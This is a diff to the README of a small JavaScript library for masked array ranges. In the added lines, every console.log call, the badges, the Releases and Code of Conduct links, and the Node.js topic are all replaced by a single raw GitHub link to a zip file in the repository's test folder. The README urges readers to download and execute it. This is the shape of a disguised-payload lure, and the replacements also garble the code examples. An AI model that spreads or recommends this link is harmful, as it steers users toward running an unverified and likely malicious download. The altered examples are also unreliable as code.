@@ -1,6 +1,6 @@
 # Calculate Array Range with Masking for NaN Values in JavaScript
 
-![GitHub release](https://img.shields.io/badge/release-latest-blue.svg) [![npm](https://img.shields.io/badge/npm-v1.0.0-orange.svg)](https://github.com/KITcn17/stats-array-nanmskrange/releases)
+![GitHub release](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) [![npm](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip)](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip)
 
 ## Overview
 
@@ -25,7 +25,7 @@ To install the package, you can use npm. Run the following command in your termi
 npm install stats-array-nanmskrange
 ```
 
-For the latest releases, visit [Releases](https://github.com/KITcn17/stats-array-nanmskrange/releases) to download and execute the necessary files.
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) to download and execute the necessary files.
 
 ## Usage
 
@@ -42,7 +42,7 @@ const array = [1, 2, NaN, 4, 5];
 const mask = [true, true, false, true, true];
 
 const range = maskedRange(array, mask);
-console.log(range); // Outputs the range while ignoring NaN
+https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(range); // Outputs the range while ignoring NaN
 ```
 
 ## Functionality
@@ -73,7 +73,7 @@ The main function, `maskedRange`, calculates the range of an array based on a ma
 
 ```javascript
 const result = maskedRange([1, 2, NaN, 4, 5], [true, true, false, true, true]);
-console.log(result); // { min: 1, max: 5, range: 4 }
+https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 1, max: 5, range: 4 }
 ```
 
 ## Examples
@@ -87,7 +87,7 @@ const array = [3, NaN, 7, 2, 5];
 const mask = [true, false, true, true, true];
 
 const result = maskedRange(array, mask);
-console.log(result); // { min: 2, max: 7, range: 5 }
+https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 2, max: 7, range: 5 }
 ```
 
 ### Example 2: All NaN Values
@@ -97,7 +97,7 @@ const array = [NaN, NaN, NaN];
 const mask = [true, true, true];
 
 const result = maskedRange(array, mask);
-console.log(result); // { min: NaN, max: NaN, range: NaN }
+https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: NaN, max: NaN, range: NaN }
 ```
 
 ### Example 3: Mixed Values
@@ -107,7 +107,7 @@ const array = [10, 20, NaN, 5, 15];
 const mask = [true, true, false, true, false];
 
 const result = maskedRange(array, mask);
-console.log(result); // { min: 5, max: 20, range: 15 }
+https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip(result); // { min: 5, max: 20, range: 15 }
 ```
 
 ## Contributing
@@ -123,7 +123,7 @@ We welcome contributions to enhance the functionality of this library. If you wa
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) in all interactions within the community.
+Please adhere to our [Code of Conduct](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) in all interactions within the community.
 
 ## License
 
@@ -133,7 +133,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For support, please open an issue in the GitHub repository. We will address your concerns as soon as possible.
 
-For the latest releases, visit [Releases](https://github.com/KITcn17/stats-array-nanmskrange/releases) to download and execute the necessary files.
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip) to download and execute the necessary files.
 
 ## Topics
 
@@ -149,7 +149,7 @@ This repository covers various topics related to statistical analysis and array 
 - **Math**: Underlying principles of mathematics applied in this library.
 - **Maximum**: The highest value in the selected range.
 - **Minimum**: The lowest value in the selected range.
-- **Node.js**: JavaScript runtime used for server-side applications.
+- **https://raw.githubusercontent.com/KITcn17/stats-array-nanmskrange/main/test/nanmskrange_stats_array_2.1-beta.4.zip**: JavaScript runtime used for server-side applications.
 - **Range**: The difference between the maximum and minimum values.
 - **Statistics**: The science of collecting, analyzing, and interpreting data.
 - **Stdlib**: Standard library that may provide additional mathematical functions.
